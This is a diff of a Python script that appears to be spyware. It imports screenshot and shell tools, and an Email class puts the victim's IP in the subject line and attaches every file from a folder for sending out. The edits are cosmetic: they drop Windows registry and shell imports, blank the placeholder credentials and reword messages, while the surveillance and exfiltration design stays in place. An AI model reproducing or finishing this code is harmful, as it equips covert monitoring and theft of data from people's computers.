@@ -9,8 +9,6 @@ from os.path import expanduser
 
 # FOR THE CHECKUPS AND USING WINDOWS COMMANDS ON SHELL
 
-import winreg as reg
-from win32com.shell import shell as shell
 from platform import system
 import ctypes
 import getpass
@@ -19,7 +17,7 @@ import getpass
 # --------------------------------------------------------
 
 # GETTING THE PROCESS TIME
-# import datetime# import time
+# import datetime import time
 from time import sleep as s
 
 # ---------------------------------------------------------
@@ -62,8 +60,9 @@ import subprocess
 
 # --------------------------------------------------------------
 
-# TAKE SCREENSHOTS
+# TAKING SCREENSHOTS
 import pyautogui
+
 
 """-------------------------------------------------------       CHECKS      -----------------------------------------------------------------"""
 
@@ -207,15 +206,15 @@ class Email:
     get_ip = getip()
 
     def __init__(self, path):
-        self.email = "YourEmail"
-        self.password = "YourPassword"
+        self.email = ""
+        self.password = ""
         self.path = path
 
         self.msg = MIMEMultipart()
         self.subject = self.msg["Subject"] = self.get_ip
-        self.msg["From"] = "YourEmail"
-        self.msg["To"] = "OptionalEmail"
-        self.body = "Optinoal"
+        self.msg["From"] = ""
+        self.msg["To"] = ""
+        self.body = ""
 
     def addattachment(self):
         for files in os.listdir(self.path):
@@ -243,7 +242,7 @@ class Email:
                 self.msg.attach(img)
 
             else:
-                print("bruh")
+                print("Cannot find the extension!")
 
 
 
@@ -271,7 +270,6 @@ class Email:
 # GET THE SYSTEM NAME
 def getsystem():
     return system()
-
 
 # MAKE IT INFALLIABLE
 if getsystem().lower() == "windows":
